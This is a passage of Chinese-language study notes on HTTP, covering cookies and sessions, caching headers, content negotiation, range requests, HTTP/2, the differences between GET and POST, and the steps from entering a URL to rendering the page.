应该注意 SessionId 的安全性问题，不能让它被恶意攻击者轻易获取，那么就不能产生一个容易被猜到的 SessionId 值。此外还需要经常**重新生成** SessionId。在对安全性要求极高的场景下，例如**转账**等操作，除了使用 Session 管理用户状态之外，还需要对**用户进行重新验证**，比如重新输入密码，或者使用**短信验证码**等方式。

###### (9) 浏览器禁用Cookie

此时无法使用 Cookie 来保存用户信息，**只能使用 Session**。除此之外不能再将 SessionId 存放到 Cookie 中，而是使用 **URL 重写技术**，将 SessionId **作为 URL 的参数进行传递**。

######  (10) Cookie与Session比较

Cookie 和 Session **都是用来跟踪浏览器用户身份的会话方式**，但是两者的应用场景不太一样。**Cookie 数据保存在客户端(浏览器端)，Session 数据保存在服务器端。**

##### 5. 缓存

###### (1) 概述

缓存可以**缓解服务器压力**；降低客户端获取**资源的延迟**：缓存通常位于**内存**中，读取缓存的速度更快，并且缓存服务器在地理位置上也有可能比源服务器来得近，例如浏览器缓存。

###### (2) 实现方法

- 让**代理服务器**进行缓存。
- 让**客户端浏览器**进行缓存。

###### (3) Cache-Control首部字段

HTTP/1.1 通过 **Cache-Control** 首部字段来控制缓存。有一些**参数**可以更具体的控制缓存行为。

**I 禁止进行缓存**

**no-store** 指令规定**不能**对请求或响应的任何一部分进行缓存。**禁止缓存**。

```http
Cache-Control: no-store
```

**II 强制确认缓存**

no-cache 指令规定缓存服务器需要**先向源服务器验证缓存资源的有效性**，只有当缓存资源有效时才能使用该缓存对客户端的请求进行响应。

```http
Cache-Control: no-cache
```

**III 私有缓存和公共缓存**

private 指令规定了将资源作为**私有缓存**，只能被单独用户使用，一般存储在**用户浏览器**中。

```http
Cache-Control: private
```

public 指令规定了将资源作为**公共缓存**，可以被多个用户使用，一般存储在**代理服务器**中。

```http
Cache-Control: public
```

**IV 缓存过期机制**

**max-age** 指令出现在**请求报文**，并且缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。

**max-age** 指令出现在**响应报文**，表示缓存资源在缓存服务器中保存的时间。

```http
Cache-Control: max-age=31536000
```

**Expires** 首部字段也可以用于告知缓存服务器该资源什么时候会**过期**。

```http
Expires: Wed, 04 Jul 2012 08:26:05 GMT
```

- 在 HTTP/1.1 中，会优先处理 max-age 指令；
- 在 HTTP/1.0 中，max-age 指令会被忽略掉。

###### (4) 缓存验证

需要先了解 **ETag** 首部字段的含义，它是**资源的唯一标识**。URL 不能唯一表示资源，例如 `http://www.google.com/` 有中文和英文两个资源，只有 **ETag** 才能对这两个资源进行**唯一标识**。

```http
ETag: "82e22293907ce725faf67773957acd12"
```

可以将**缓存资源的 ETag** 值放入 **If-None-Match** 首部，服务器收到该请求后，判断**缓存资源的 ETag 值**和资源的**最新 ETag 值是否一致**，如果一致则表示缓存资源**有效**，**返回 304 Not Modified**，这就表示浏览器**可以继续使用之前缓存的资源**而不用重新传输。

```http
If-None-Match: "82e22293907ce725faf67773957acd12"
```

**Last-Modified** 首部字段也可以用于**缓存验证**，它包含在源服务器发送的响应报文中，指示源服务器对资源的最后修改时间。但是它是一种弱校验器，因为只能精确到一秒，所以它通常作为 ETag 的备用方案。如果响应首部字段里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。服务器只在所请求的资源在给定的日期时间之后对内容进行过修改的情况下才会将资源返回，状态码为 200 OK。如果请求的资源从那时起未经修改，那么返回一个不带有实体主体的 304 Not Modified 响应报文。

```http
Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT
```

```http
If-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT
```

##### 6. 内容协商

通过内容协商返回**最合适的内容**，例如根据浏览器的默认语言选择返回中文界面还是英文界面。

###### (1) 类型

**I 服务端驱动型**：客户端设置特定的 **HTTP 首部字段**，例如 Accept、Accept-Charset、Accept-Encoding、Accept-Language，服务器根据这些字段返回特定的资源。它存在以下问题：

- 服务器很难知道客户端浏览器的全部信息；
- 客户端提供的信息相当冗长（HTTP/2 协议的首部压缩机制缓解了这个问题），并且存在隐私风险（HTTP 指纹识别技术）；
- 给定的资源需要返回不同的展现形式，共享缓存的效率会降低，而服务器端的实现会越来越复杂。

**II 代理驱动型**：服务器返回 300 Multiple Choices 或者 406 Not Acceptable，客户端从中选出最合适的那个资源。

###### (2) Vary

```html
Vary: Accept-Language
```

在使用内容协商的情况下，只有当缓存服务器中的缓存满足内容协商条件时，才能使用该缓存，否则应该向源服务器请求该资源。

例如一个客户端发送了一个包含 Accept-Language 首部字段的请求之后，源服务器返回的响应包含 `Vary: Accept-Language` 内容，缓存服务器对这个响应进行缓存之后，在客户端下一次访问同一个 URL 资源，并且 Accept-Language 与缓存中的对应的值相同时才会返回该缓存。

##### 6. 编码

###### (1) 压缩传输的内容编码

内容编码将==**实体主体**==进行**压缩**，从而减少传输的数据量。请求首部不压缩。常用的内容编码有：gzip、compress、deflate、identity。

浏览器发送 Accept-Encoding 首部，其中包含有它所支持的压缩算法，以及各自的优先级。服务器则从中选择一种，使用该算法对响应的消息主体进行压缩，并且发送 Content-Encoding 首部来告知浏览器它选择了哪一种算法。由于该内容协商过程是基于编码类型来选择资源的展现形式的，响应报文的 Vary 首部字段至少要包含 Content-Encoding。

###### (2) 分块传输编码

Chunked Transfer Encoding，可以把数据分割成多块，让浏览器逐步显示页面。

##### 7. 范围请求

如果网络出现中断，服务器只发送了一部分数据，范围请求可以使得客户端只请求服务器**未发送的那部分数据**，从而避免服务器重新发送所有数据。

###### (1) Range

在请求报文中添加 **Range** 首部字段指定请求的**范围**。

```http
GET /z4d4kWk.jpg HTTP/1.1
Host: i.imgur.com
Range: bytes=0-1023
```

请求成功的话服务器返回的响应包含 **==206== Partial Content** 状态码。

```http
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/146515
Content-Length: 1024
...
(binary content)
```

###### (2) Accept-Ranges

响应首部字段 **Accept-Ranges** 用于告知客户端是否能处理范围请求，可以**处理使用 bytes**，否则使用 **none**。

```http
Accept-Ranges: bytes
```

###### (3) 相关响应状态码

- 在范围请求**成功**的情况下，服务器会返回 **206** Partial Content 状态码。
- 在请求的范围**越界**的情况下，服务器会返回 **416** Requested Range Not Satisfiable 状态码。
- 在**不支持**范围请求的情况下，服务器会返回 **200** OK 状态码。

##### 8. 多部分对象集合

一份报文主体内可含有**多种类型**的实体同时发送，每个部分之间用 **boundary** 字段定义的分隔符进行分隔，每个部分都可以有首部字段。例如，上传多个表单时可以使用如下方式：

```html
Content-Type: multipart/form-data; boundary=AaB03x	// 指定Boundary

--AaB03x
Content-Disposition: form-data; name="submit-name"

Larry
--AaB03x
Content-Disposition: form-data; name="files"; filename="file1.txt"
Content-Type: text/plain

... contents of file1.txt ...
--AaB03x--
```



#### HTTP/2.0

##### 1. HTTP/1.1新特性

- 默认是**长连接**。
- 支持**流水线技术**。
- 支持同时打开多个 TCP 连接。
- 支持**虚拟主机**。
- 新增**状态码** 100。
- 支持**分块传输编码**。
- 新增缓存处理指令 **max-age**。
- 废弃了 LINK 和 UNLINK 方法。

##### 2. HTTP/1.x 缺陷

HTTP/1.x 实现简单是以牺牲性能为代价的：

- 客户端需要使用**多个连接**才能实现并发和缩短延迟；
- **不会压缩请求和响应首部**，从而导致不必要的**网络流量**；
- 不支持有效的**资源优先级**，致使底层 TCP 连接的利用率低下。

##### 3. 二进制分帧层

HTTP/2.0 将**报文**分成 **HEADERS** 帧和 **DATA** 帧，它们都是**二进制格式**的。

<img src="assets/1563596477939.png" alt="1563596477939" style="zoom:62%;" />

在通信过程中，只会有**一个 TCP 连接**存在，它承载了任意数量的**双向数据流（Stream）**。

- 一个**数据流**（Stream）都有一个唯一标识符和可选的**优先级信息**，用于承载双向信息。
- **消息**（Message）是与逻辑请求或响应对应的完整的一系列**帧**。
- **帧**（Frame）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。

<img src="assets/1563596492865.png" alt="1563596492865" style="zoom:57%;" />

##### 4. 服务端推送

HTTP/2.0 在客户端**请求一个资源**时，会把相关的资源**一起**发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源**一起发给客户端**。

<img src="assets/1563596507274.png" alt="1563596507274" style="zoom:62%;" />

##### 5. 首部压缩

HTTP/1.1 的**首部**带有大量信息，而且每次都要重复发送，浪费了网络资源。

HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前**见过的首部字段表**，从而避免了重复传输。不仅如此，HTTP/2.0 也使用 **Huffman** 编码对首部字段进行**压缩**。

<img src="assets/1563596523232.png" alt="1563596523232" style="zoom:52%;" />



#### GET和POST比较

GET 是从服务器上获取数据，POST 是向服务器传送数据。 GET 和 POST 只是一种传递数据的方式，GET 也可以把数据传到服务器，它们的**本质都是发送请求和接收结果**，只是组织格式和数据量上面有差别。

##### 1. 基本作用

GET 用于**获取资源**，而 POST 用于**传输实体主体**。

##### 2. 参数位置

GET 和 POST 的请求都能使用**额外的参数**，但是 GET 的参数是以查询字符串出现在 **URL** 中，而 POST 的参数存储在**实体主体**中。不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。     

因为 URL **只支持 ASCII 码**，因此 GET 的参数中如果存在**中文等字符**就需要先进行**编码**。例如 **中文** 两个字会转换为 **%E4%B8%AD%E6%96%87**，而**空格**会转换为 **%20**。POST 参数支持标准字符集。

```
GET /test/demo_form.asp?name1=value1&name2=value2 HTTP/1.1
```

```
POST /test/demo_form.asp HTTP/1.1
Host: w3schools.com
name1=value1&name2=value2
```

##### 3. 安全性

GET 方法**只是可读**的，不会改变服务器状态，所以对服务器数据状态是**安全**的，而 POST 却**不是**，因为 POST 的目的是传送实体主体内容，上传成功之后，服务器可能把这个数据存储到数据库中，因此**状态**也就发生了**改变**。

安全的方法除了 GET 之外还有：HEAD、OPTIONS。不安全的方法除了 POST 之外还有 PUT、DELETE。

但是对于**传输安全**来说，由于都没有加密，所以 GET 与 POST 安全程度一样，**都不安全**。

##### 4. 幂等性

**幂等**的 HTTP 方法，同样的请求被**执行一次与连续执行多次的效果是一样**的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。所有的==**安全方法也都是幂等**==的。在正确实现的条件下，**GET，HEAD，PUT 和 DELETE** 等方法都是**幂等**的，而 **POST** 方法**不是**。

**GET** /pageX HTTP/1.1 是**幂等**的，连续调用多次，客户端接收到的结果都是一样的：

```http
GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
GET /pageX HTTP/1.1
```

**POST** /add_row HTTP/1.1 **不是幂等**的，如果调用多次，就会增加多行记录：

```http
POST /add_row HTTP/1.1   -> Adds a 1nd row
POST /add_row HTTP/1.1   -> Adds a 2nd row
POST /add_row HTTP/1.1   -> Adds a 3rd row
```

PS：**DELETE** /idX/delete HTTP/1.1 是**幂等**的，即使不同的请求接收到的状态码不一样：

```http
DELETE /idX/delete HTTP/1.1   -> Returns 200 if idX exists
DELETE /idX/delete HTTP/1.1   -> Returns 404 as it just got deleted
DELETE /idX/delete HTTP/1.1   -> Returns 404
```

##### 5. 可缓存性

请求报文的 **HTTP 方法本身是可缓存**的，包括 **GET 和 HEAD**，但是 PUT 和 DELETE 不可缓存，**POST** 在多数情况下**不可缓存**的。

##### 6. XMLHttpRequest

**XMLHttpRequest** 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 **URL** 来获取数据的简单方式，并且**不会使整个页面刷新**。这使得网页**只更新一部分页面**而不会打扰到用户。XMLHttpRequest 在 **AJAX** 中被大量使用。

- 使用 XMLHttpRequest 的 **POST** 方法时，浏览器会**先发送 Header 再发送 Data**。但并不是所有浏览器会这么做，例如火狐就不会。
- 使用 XMLHttpRequest 的 **GET** 方法时，浏览器会将 **Header 和 Data 一起发送**。

##### 7. 其他

- GET 被强制服务器支持。
- 浏览器对 URL 的长度有限制，所以 GET 请求不能代替 POST 请求发送大量数据。GET请求发送数据一般更小。**GET 传送的数据量较小，不能大于 2KB。POST 传送的数据量较大**，一般被默认为不受限制。但理论上，IIS4 中最大量为 80KB，IIS5 中为 100KB。 POST 基本没有限制，上传文件一般都是用 POST 方式的。只不过要修改 form 里面的那个 type 参数。







#### 面试题

##### 1. 当在浏览器中输入URL并按下回车会发生什么？

###### (1) 解析URL

浏览器通过 URL 能够知道下面的信息：

- Protocol "http"：使用 HTTP 协议。

- Resource "/"：请求的资源是主页(index)。

解析的时候会判断输入的是 **URL** 还是**搜索的关键字**？当协议或主机名不合法时，浏览器会将地址栏中输入的文字传给默认的搜索引擎。大部分情况下，在把文字传递给搜索引擎的时候，URL 会带有特定的一串字符，用来告诉搜索引擎这次搜索来自这个特定浏览器。

由于 GET 方法只支持 ASCII 码，所以中文等非 ASCII 字符会被转换为 Unicode 字符。

###### (2) 检查HSTS列表

浏览器检查自带的“**预加载 HSTS**（HTTP 严格传输安全）”列表，这个列表里包含了那些请求浏览器**只使用 HTTPS** 进行连接的网站。如果网站在**这个列表里，浏览器会使用 HTTPS** 而不是 HTTP 协议，否则，最初的请求会使用 **HTTP 协议**发送。注意，一个网站哪怕不在 HSTS 列表里，也**可以要求**浏览器对自己使用 HSTS 政策进行访问。浏览器向网站发出第一个 HTTP 请求之后，网站会返回浏览器一个响应，请求浏览器**只使用 HTTPS 发送请求**。然而，就是这第一个 HTTP 请求，却可能会使用户受到 downgrade attack 的威胁，这也是为什么现代浏览器都预置了 HSTS 列表。

###### (3) DNS查询

浏览器**检查域名是否在缓存**当中（要查看 Chrome 当中的缓存， 打开 chrome://net-internals/#dns）。如果缓存中没有，就去调用 **gethostbyname** 库函数（操作系统不同函数也不同）进行查询。gethostbyname 函数在试图进行 DNS 解析之前首先检查域名是否在**本地 Hosts 里**。如果 `gethostbyname` 没有这个域名的缓存记录，也没有在 `hosts` 里找到，它将**会向 DNS 服务器**发送一条 DNS 查询请求。DNS 服务器是由网络通信栈提供的，通常是**本地路由器或者 ISP 的缓存 DNS 服务器**。首先查询本地 DNS 服务器。如果 DNS 服务器和主机在**同一个子网内**，系统会按照下面的 **ARP 过程**对 DNS 服务器进行 **ARP 查询**。如果 DNS 服务器和主机**在不同的子网**，系统会按照下面的 ARP 过程对**默认网关进行查询**。

###### (4) ARP过程

要想发送 ARP（地址解析协议）广播，需要有一个**目标 IP 地址**，同时还需要知道用于发送 ARP 广播的接口的 **MAC 地址**。

首先查询 **ARP 缓存**，如果缓存命中，返回结果：目标 IP = MAC。

如果缓存没有命中：

- 查看**路由表**，看看目标 **IP 地址**是不是在本地路由表中的**某个子网**内。是的话，使用跟那个子网相连的接口，否则使用与**默认网关相连的接口**。
- 查询选择的网络接口的 MAC 地址。
- 发送一个二层（数据链路层）ARP 请求：

**ARP Request：**

```
Sender MAC: interface:mac:address:here
Sender IP: interface.ip.goes.here
Target MAC: FF:FF:FF:FF:FF:FF (Broadcast)
Target IP: target.ip.goes.here
```

根据连接主机和路由器的硬件类型不同，可以分为以下几种情况：

**直连**：

- 如果和**路由器是直接连接**的，路由器会返回一个 `ARP Reply` （见下面）。

**集线器**：

- 如果连接到一个集线器，集线器会把 ARP 请求向所有其它端口广播，如果路由器也“连接”在其中，它会返回一个 `ARP Reply` 。

**交换机**：

- 如果连接到了一个**交换机**，交换机会检查本地 **CAM/MAC 表**，看看哪个端口有要找的那个 MAC 地址，如果没有找到，交换机会向所有其它**端口广播这个 ARP 请求**。
- 如果交换机的 MAC/CAM 表中有对应的条目，交换机会向有想要查询的 MAC 地址的那个端口发送 ARP 请求。
- 如果路由器也“连接”在其中，它会返回一个 `ARP Reply`。

**ARP Reply：**

```
Sender MAC: target:mac:address:here
Sender IP: target.ip.goes.here
Target MAC: interface:mac:address:here
Target IP: interface.ip.goes.here
```

现在有了 **DNS 服务器或者默认网关的 IP 地址**，可以继续 **DNS 请求**了：

- 使用 53 端口向 DNS 服务器发送 **UDP 请求包**，如果响应包太大，会使用 **TCP 协议**。
- 如果本地 /ISP DNS 服务器没有找到结果，它会发送一个**递归查询请求**，**一层一层向高层 DNS 服务器**做查询，直到查询到起始授权机构，如果找到会把结果返回。

###### (5) 使用套接字

当浏览器得到了**目标服务器的 IP 地址**，以及 URL 中给出来**端口号**（http 协议默认端口号是 80， https 默认端口号是 443），它会调用**系统库函数 socket** ，请求一个 **TCP 流套接字**，对应的参数是 **AF_INET/AF_INET6 和 SOCK_STREAM** 。

- 这个请求首先被交给传输层，在传输层请求被封装成 TCP segment。目标端口会被加入头部，源端口会在系统内核的动态端口范围内选取（Linux下是ip_local_port_range)。
- TCP segment 被送往**网络层**，网络层会在其中再加入一个 IP 头部，里面包含了目标服务器的 IP 地址以及本机的 IP 地址，把它封装成一个IP packet。
- 这个 TCP packet 接下来会进入**链路层**，链路层会在**封包中加入 frame 头部**，里面包含了本地内置网卡的 MAC 地址以及**网关（本地路由器）的 MAC 地址**。像前面说的一样，如果内核不知道网关的 MAC 地址，它必须进行 ARP 广播来查询其地址。

到了现在，TCP 封包已经准备好了，可以使用以太网、WIFi、蜂窝数据网络等进行数据传输。最终封包会到达管理**本地子网的路由器**。在那里出发，它会继续经过**自治区域**(AS)的边界路由器，其他自治区域，最终到达目标服务器。一路上经过的这些路由器会从 IP 数据报头部里提取出目标地址，并将封包正确地路由到下一个目的地。IP 数据报头部 time to live (TTL) 域的值每经过一个**路由器就减 1**，如果封包的 **TTL 变为 0**，或者路由器由于网络拥堵等原因封包队列满了，那么这个包会被路由器**丢弃**。

上面的发送和接受过程在 **TCP 连接期间会发生很多次**：

- 客户端选择一个初始序列号(ISN)，将设置了 SYN 位的封包发送给服务器端，表明自己要建立连接并设置了初始序列号

- 服务器端接收到 SYN 包，如果它可以建立连接：服务器端选择它自己的初始序列号服务器端设置 SYN 位，表明自己选择了一个初始序列号服务器端把 (客户端ISN + 1) 复制到 ACK 域，并且设置 ACK 位，表明自己接收到了客户端的第一个封包。

- 客户端通过发送下面一个封包来确认这次连接：自己的序列号 +1 接收端 ACK+1设置 ACK 位。

- 数据通过下面的方式传输：当一方发送了 N 个 Bytes 的数据之后，将自己的 SEQ 序列号也增加N另一方确认接收到这个数据包（或者一系列数据包）之后，它发送一个 ACK 包，ACK 的值设置为接收到的数据包的最后一个序列号。

- 关闭连接时：要关闭连接的一方发送一个 FIN 包另一方确认这个 FIN 包，并且发送自己的 FIN 包要关闭的一方使用 ACK 包来确认接收到了 FIN。


###### (6) TLS握手

- 客户端发送一个 `ClientHello` 消息到**服务器端**，消息中同时包含了它的 Transport Layer Security (TLS) 版本，可用的加密算法和压缩算法。
- 服务器端向客户端返回一个 `ServerHello` 消息，消息中包含了服务器端的TLS版本，服务器所选择的加密和压缩算法，以及数字证书认证机构（Certificate Authority，缩写 CA）签发的服务器公开证书，证书中包含了公钥。客户端会使用这个公钥加密接下来的握手过程，直到协商生成一个新的对称密钥。
- 客户端根据自己的信任 CA 列表，验证服务器端的证书是否可信。如果认为可信，客户端会生成一串伪随机数，使用服务器的公钥加密它。这串随机数会被用于生成新的对称密钥。
- 服务器端使用自己的私钥解密上面提到的随机数，然后使用这串随机数生成自己的对称主密钥。
- 客户端发送一个 `Finished` 消息给服务器端，使用对称密钥加密这次通讯的一个散列值。
- 服务器端生成自己的 hash 值，然后解密客户端发送来的信息，检查这两个值是否对应。如果对应，就向客户端发送一个 `Finished` 消息，也使用协商好的对称密钥加密。
- 从现在开始，接下来整个 TLS 会话都使用**对称秘钥**进行加密，传输应用层（HTTP）内容。

###### (7) HTTP协议

如果浏览器是 Google 出品的，它不会使用 HTTP 协议来获取页面信息，而是会与服务器端发送请求，商讨使用 SPDY 协议。如果浏览器使用 HTTP 协议而不支持 SPDY 协议，它会向服务器发送这样的一个请求:

```
GET / HTTP/1.1
Host: google.com
Connection: close
[其他头部]
```

“其他头部”包含了一系列的由冒号分割开的键值对，它们的格式符合HTTP协议标准，它们之间由一个换行符分割开来。（这里我们假设浏览器没有违反HTTP协议标准的bug，同时假设浏览器使用 `HTTP/1.1` 协议，不然的话头部可能不包含 `Host` 字段，同时 `GET` 请求中的版本号会变成 `HTTP/1.0` 或者 `HTTP/0.9` 。）

HTTP/1.1 定义了“关闭连接”的选项 "close"，发送者使用这个选项指示这次连接在响应结束之后会断开。例如：

> Connection: close

在发送完这些请求和头部之后，浏览器发送一个换行符，表示要发送的内容已经结束了。

服务器端**返回一个响应码**，指示这次请求的状态，响应的形式是这样的:

```
200 OK
[响应头部]
```

然后是一个**换行**，接下来有效载荷(payload)，也就是 `www.google.com` 的 HTML 内容。服务器下面可能会关闭连接，如果客户端请求保持连接的话，服务器端会保持连接打开，以供之后的请求重用。

如果浏览器发送的 HTTP 头部包含了足够多的信息（例如包含了 Etag 头部），以至于服务器可以判断出，浏览器缓存的文件版本自从上次获取之后没有再更改过，服务器可能会返回这样的响应:

```
304 Not Modified
[响应头部]
```

这个响应**没有有效载荷**，**浏览器会从自己的缓存中取出想要的内容**。

在解析完 HTML 之后，浏览器和客户端会重复上面的过程，直到 **HTML 页面引入的所有资源**（图片，CSS，favicon.ico等等）全部都获取完毕，区别只是头部的 **GET / HTTP/1.1** 会变成 GET /$(相对 www.google.com 的URL) HTTP/1.1 。

如果 HTML 引入了 www.google.com 域名之外的资源，浏览器会回到上面解析域名那一步，按照下面的步骤往下一步一步执行，请求中的 Host 头部会变成另外的域名。

###### (8) HTTP服务器请求处理

HTTPD(HTTP Daemon)在服务器端处理请求/响应。最常见的 HTTPD 有 Linux 上常用的 **Apache 和 nginx**。

- HTTPD 接收请求，服务器把请求拆分为以下几个参数：HTTP 请求方法(`GET`, `POST`, `HEAD`, `PUT`, `DELETE`, `CONNECT`, `OPTIONS`, 或者 `TRACE`)。直接在地址栏中输入 URL 这种情况下，使用的是 GET 方法域名：google.com请求路径/页面：/ (我们没有请求google.com下的指定的页面，因此 / 是默认的路径)。

- 服务器验证其上已经配置了 google.com 的虚拟主机。

- 服务器验证 google.com 接受 GET 方法。

- 服务器验证该用户可以使用 GET 方法(根据 IP 地址，身份信息等)。

- 如果服务器安装了 URL 重写模块（例如 Apache 的 mod_rewrite 和 IIS 的 URL Rewrite），服务器会尝试匹配重写规则，如果匹配上的话，服务器会按照规则重写这个请求。

- 服务器根据请求信息获取相应的响应内容，这种情况下由于访问路径是 "/" ,会访问首页文件（你可以重写这个规则，但是这个是最常用的）。

- 服务器会使用指定的处理程序分析处理这个文件，假如 Google 使用 PHP，服务器会使用 PHP 解析 index 文件，并捕获输出，把 PHP 的输出结果返回给请求者。

###### (9) 浏览器后续操作

当服务器提供了**资源**之后（HTML，CSS，JS，图片等），浏览器会执行下面的操作：

- **解析** ：HTML，CSS，JS。HTML 解析器的主要工作是对 HTML 文档进行解析，生成解析树。通过遍历 DOM 节点树创建一个“Frame 树”或“渲染树”，并计算每个节点的各个 CSS 样式值。
- **渲染** ：构建 DOM 树 -> 渲染 -> 布局 -> 绘制。

##### 2. 简述Web页面请求过程

这是上一个题的另一个回答版本了。。

**1.DHCP配置主机信息**

- 假设主机最开始没有 **IP 地址**以及其它信息，那么就需要先使用 **DHCP** 来获取。

- 主机生成一个 DHCP **请求报文**，并将这个报文放入具有**目的端口 67 和源端口 68 的 UDP** 报文段中。

- 该报文段则被放入在一个具有**广播 IP** 目的地址(255.255.255.255) 和源 IP 地址（0.0.0.0）的 IP 数据报中。

- 该数据报则被放置在 **MAC** 帧中，该帧具有目的地址 FF:FF:FF:FF:FF:FF，将广播到与**交换机连接的所有设备**。

- 连接在交换机的 **DHCP 服务器**收到广播帧之后，不断地向上分解得到 IP 数据报、UDP 报文段、DHCP 请求报文，之后生成 **DHCP ACK** 报文，该报文包含以下信息：IP 地址、DNS 服务器的 IP 地址、默认网关路由器的 IP 地址和子网掩码。该报文被放入 UDP 报文段中，UDP 报文段有被放入 IP 数据报中，最后放入 MAC 帧中。

- 该帧的目的地址是请求主机的 **MAC 地址**，因为交换机具有自学习能力，之前主机发送了广播帧之后就记录了 MAC 地址到其转发接口的交换表项，因此现在交换机就可以直接知道应该向哪个接口发送该帧。

- 主机收到该帧后，不断分解得到 DHCP 报文。之后就配置它的 IP 地址、子网掩码和 DNS 服务器的 IP 地址，并在其 IP 转发表中安装默认网关。

**2. ARP解析MAC地址**

- 主机通过浏览器生成一个 **TCP 套接字**，套接字向 HTTP 服务器发送 **HTTP 请求**。为了生成该**套接字**，主机需要知道网站的域名对应的 **IP 地址**。

- 主机生成一个 **DNS** 查询报文，该报文具有 **53** 号端口，因为 DNS 服务器的端口号是 53。

- 该 DNS 查询报文被放入目的地址为 **DNS** 服务器 IP 地址的 IP 数据报中。

- 该 IP 数据报被放入一个**以太网帧**中，该帧将发送到**网关路由器**。

- DHCP 过程只知道**网关路由器的 IP** 地址，为了获取网关路由器的 **MAC 地址**，需要使用 **ARP 协议**。

- 主机生成一个包含目的地址为网关路由器 IP 地址的 ARP 查询报文，将该 ARP 查询报文放入一个具有广播目的地址（FF:FF:FF:FF:FF:FF）的以太网帧中，并向交换机发送该以太网帧，交换机将该帧转发给所有的连接设备，包括网关路由器。

- 网关路由器接收到该帧后，不断向上分解得到 ARP 报文，发现其中的 IP 地址与其接口的 IP 地址匹配，因此就发送一个 ARP 回答报文，包含了它的 **MAC 地址**，发回给主机。

**3. DNS解析域名**

- 知道了网关路由器的 MAC 地址之后，就可以继续 DNS 的解析过程了。
- 首先看本地有没有域名到 IP 的**缓存**记录，**有就直接用**了。
- 网关路由器接收到包含 DNS 查询报文的以太网帧后，抽取出 IP 数据报，并根据转发表决定该 IP 数据报应该转发的路由器。
- 因为路由器具有**内部网关协议（RIP、OSPF）和外部网关协议（BGP）**这两种路由选择协议，因此路由表中已经配置了网关路由器到达 DNS 服务器的路由表项。
- 到达 DNS 服务器之后，DNS 服务器抽取出 DNS 查询报文，并在 DNS 数据库中查找待解析的域名。
- 找到 DNS 记录之后，发送 DNS 回答报文，将该回答报文放入 UDP 报文段中，然后放入 IP 数据报中，通过路由器反向转发回网关路由器，并经过以太网交换机到达主机。
- 主机收到 DNS 消息之后也会在本地进行**缓存**。

**4. HTTP请求页面**

- 有了 HTTP 服务器的 **IP 地址**之后，主机就能够生成 **TCP 套接字**，该套接字将用于向 Web 服务器发送 HTTP **GET** 报文。

- 在生成 **TCP 套接字之前**，必须先与 HTTP 服务器进行**三次握手来建立连接**。生成一个具有目的端口 80 的 TCP SYN 报文段，并向 HTTP 服务器发送该报文段。

- HTTP 服务器收到该报文段之后，生成 **TCP SYN ACK** 报文段，发回给主机。

- 连接建立之后，浏览器生成 **HTTP GET 报文**，并交付给 HTTP 服务器。

- HTTP 服务器从 TCP **套接字**读取 HTTP GET 报文，生成一个 HTTP **响应报文**，将 Web 页面内容放入报文主体中，发回给主机。

- 浏览器收到 HTTP 响应报文后，抽取出 Web 页面内容，之后进行**渲染**，显示 **Web** 页面。



#### 参考资料

- **上野宣. 图解 HTTP[M]. 人民邮电出版社, 2014.**
- [MDN : HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP)
- [HTTP/2 简介](https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn)
- [htmlspecialchars](http://php.net/manual/zh/function.htmlspecialchars.php)
- [Difference between file URI and URL in java](http://java2db.com/java-io/how-to-get-and-the-difference-between-file-uri-and-url-in-java)
- [How to Fix SQL Injection Using Java PreparedStatement & CallableStatement](https://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-using-prepared-callable-statement)
- [浅谈 HTTP 中 Get 与 Post 的区别](https://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html)
- [Are http:// and www really necessary?](https://www.webdancers.com/are-http-and-www-necesary/)
- [HTTP (HyperText Transfer Protocol)](https://www.ntu.edu.sg/home/ehchua/programming/webprogramming/HTTP_Basics.html)
- [Web-VPN: Secure Proxies with SPDY & Chrome](https://www.igvita.com/2011/12/01/web-vpn-secure-proxies-with-spdy-chrome/)
- [File:HTTP persistent connection.svg](http://en.wikipedia.org/wiki/File:HTTP_persistent_connection.svg)
- [Proxy server](https://en.wikipedia.org/wiki/Proxy_server)
- [What Is This HTTPS/SSL Thing And Why Should You Care?](https://www.x-cart.com/blog/what-is-https-and-ssl.html)
- [What is SSL Offloading?](https://securebox.comodo.com/ssl-sniffing/ssl-offloading/)
- [Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption](https://docs.oracle.com/cd/E19424-01/820-4811/6ng8i26bn/index.html)
- [An Introduction to Mutual SSL Authentication](https://www.codeproject.com/Articles/326574/An-Introduction-to-Mutual-SSL-Authentication)
- [The Difference Between URLs and URIs](https://danielmiessler.com/study/url-uri/)
- [Cookie 与 Session 的区别](https://juejin.im/entry/5766c29d6be3ff006a31b84e#comment)
- [COOKIE 和 SESSION 有什么区别](https://www.zhihu.com/question/19786827)
- [Cookie/Session 的机制与安全](https://harttle.land/2015/08/10/cookie-session.html)
- [HTTPS 证书原理](https://shijianan.com/2017/06/11/https/)
- [What is the difference between a URI, a URL and a URN?](https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn)
- [XMLHttpRequest](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest)
- [XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST?](https://blog.josephscott.org/2009/08/27/xmlhttprequest-xhr-uses-multiple-packets-for-http-post/)
- [Symmetric vs. Asymmetric Encryption – What are differences?](https://www.ssl2buy.com/wiki/symmetric-vs-asymmetric-encryption-what-are-differences)
- [Web 性能优化与 HTTP/2](https://www.kancloud.cn/digest/web-performance-http2)
- [HTTP/2 简介](https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn)
- https://www.jianshu.com/p/14cd2c9d2cd2





### HTTPS

#### 基础

